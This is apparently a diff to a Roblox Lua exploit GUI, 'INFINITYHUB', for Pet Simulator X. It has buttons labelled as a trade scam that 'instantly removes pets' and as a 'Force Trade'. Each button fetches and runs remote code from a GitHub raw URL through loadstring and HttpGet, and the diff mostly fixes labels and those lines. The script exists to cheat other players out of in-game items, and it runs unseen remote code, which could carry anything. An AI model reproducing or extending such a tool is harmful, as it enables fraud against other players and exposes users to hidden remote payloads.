@@ -1,3 +1,5 @@
+
+
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local line = Instance.new("Frame")
@@ -41,7 +43,7 @@ TextLabel.BackgroundTransparency = 1.000
 TextLabel.BorderSizePixel = 0
 TextLabel.Size = UDim2.new(0, 296, 0, 29)
 TextLabel.Font = Enum.Font.FredokaOne
-TextLabel.Text = "TRADESCAM JAN UPDT- INF HUB"
+TextLabel.Text = "PSX Force Trade and Trade scam - INFINITYHUB"
 TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextLabel.TextScaled = true
 TextLabel.TextSize = 14.000
@@ -84,7 +86,7 @@ TextLabel_3.BorderSizePixel = 0
 TextLabel_3.Position = UDim2.new(0.131756753, 0, 0.365853667, 0)
 TextLabel_3.Size = UDim2.new(0, 232, 0, 25)
 TextLabel_3.Font = Enum.Font.FredokaOne
-TextLabel_3.Text = "TRADE-SCAM" (UPDATED)"
+TextLabel_3.Text = "TRADE-SCAM (UPDATED)"
 TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextLabel_3.TextScaled = true
 TextLabel_3.TextSize = 14.000
@@ -96,13 +98,13 @@ tradescam.BackgroundColor3 = Color3.fromRGB(16, 126, 18)
 tradescam.Position = UDim2.new(0.0337837823, 0, 0.45799458, 0)
 tradescam.Size = UDim2.new(0, 278, 0, 29)
 tradescam.Font = Enum.Font.GothamBold
-tradescam.Text = "TRADE SCAM" (INSTANT REMOVE PETS)"
+tradescam.Text = "TRADE SCAM (INSTANT REMOVE PETS)"
 tradescam.TextColor3 = Color3.fromRGB(0, 0, 0)
 tradescam.TextScaled = true
 tradescam.TextSize = 14.000
 tradescam.TextWrapped = true
 tradescam.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/xhenon1/PetsimxAuto/main/Tradescam '))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/xhenon1/PetsimxAuto/main/Tradescam'))() 
 end)
 
 
@@ -143,13 +145,13 @@ newdupe.Position = UDim2.new(0.030405404, 0, 0.216802165, 0)
 newdupe.Size = UDim2.new(0, 278, 0, 25)
 newdupe.Visible = false
 newdupe.Font = Enum.Font.GothamBold
-newdupe.Text = "ForceTrade (v3.1)"
+newdupe.Text = "Force Trade (v3.1)"
 newdupe.TextColor3 = Color3.fromRGB(0, 0, 0)
 newdupe.TextScaled = true
 newdupe.TextSize = 14.000
 newdupe.TextWrapped = true
 newdupe.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/xhenon1/PetsimxAuto/main/Tradescam '))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/xhenon1/PetsimxAuto/main/Tradescam'))() 
 end)
 
 UICorner_4.Parent = newdupe
@@ -216,8 +218,6 @@ wait(30)
 timer.Visible = true
 newdupe.Visible = true
 olddupe.Visible = true
-
-
 
 
 
